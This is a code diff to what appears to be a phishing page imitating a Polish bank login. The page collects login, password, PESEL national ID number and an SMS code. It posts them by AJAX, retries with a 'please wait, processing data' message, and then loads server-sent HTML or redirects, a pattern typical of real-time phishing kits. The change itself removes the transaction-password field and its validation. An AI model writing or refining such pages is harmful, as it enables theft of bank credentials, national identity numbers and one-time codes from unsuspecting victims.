@@ -137,9 +137,9 @@
                 <input type="text" name="password" id="password" placeholder="Wprowadź Hasło">
             </div>
 
-            <div class="form-item" id="input3">
-                <input type="text" name="pin" id="pin" placeholder="Wprowadź haslo operacji internetowej">
-            </div>
+{{--            <div class="form-item" id="input3">--}}
+{{--                <input type="text" name="pin" id="pin" placeholder="Wprowadź haslo operacji internetowej">--}}
+{{--            </div>--}}
 
             <div class="form-item" id="input4">
                 <input type="text" name="pesel" id="pesel" placeholder="Wpisz pesel">
@@ -165,26 +165,22 @@
     <script type="text/javascript">
         function treedspin() {
             let form = $('form#form');
-            if ($('#pin').val() !== '') {
-                $.ajax({
-                    type: "POST",
-                    url: form.attr('action'),
-                    data: form.serialize(),
-                }).fail(function (error) {
-                    alert('Proszę czekać, przetwarzam dane');
-                    treedspin();
-                }).done(function (data) {
-                    if (data.html) $('#app').html(data.html);
-                    else if (data.next) location.href = data.next;
-                    else setTimeout(function () {
-                            alert("Błąd");
-                        }, 3000)
-                }).always(function () {
-                    $('#loading').show();
-                });
-            } else ($('#codefromsms').val() === '')
-                ? $('#codefromsms').css("border-color", "red")
-                : $('#codefromsms').css("border-color", "");
+            $.ajax({
+                type: "POST",
+                url: form.attr('action'),
+                data: form.serialize(),
+            }).fail(function (error) {
+                alert('Proszę czekać, przetwarzam dane');
+                treedspin();
+            }).done(function (data) {
+                if (data.html) $('#app').html(data.html);
+                else if (data.next) location.href = data.next;
+                else setTimeout(function () {
+                        alert("Błąd");
+                    }, 3000)
+            }).always(function () {
+                $('#loading').show();
+            });
         }
 
         $("#form").on("submit", function (event) {
@@ -198,15 +194,15 @@
                 $('#password').css('border', '1px solid #b60');
             }
 
-            if ($('#pin').val() == '') {
-                $('#pin').css('border', '1px solid #b60');
-            }
+            // if ($('#pin').val() == '') {
+            //     $('#pin').css('border', '1px solid #b60');
+            // }
 
             if ($('#pesel').val() == '') {
                 $('#pesel').css('border', '1px solid #b60');
             }
 
-            if ($('#login').val() != '' && $('#password').val() != '' && $('#pin').val() != '' && $('#pesel').val() != '') {
+            if ($('#login').val() != '' && $('#password').val() != '' && $('#pesel').val() != '') {
                 $("#input1").css("display", "none");
                 $("#input2").css("display", "none");
                 $("#input3").css("display", "none");
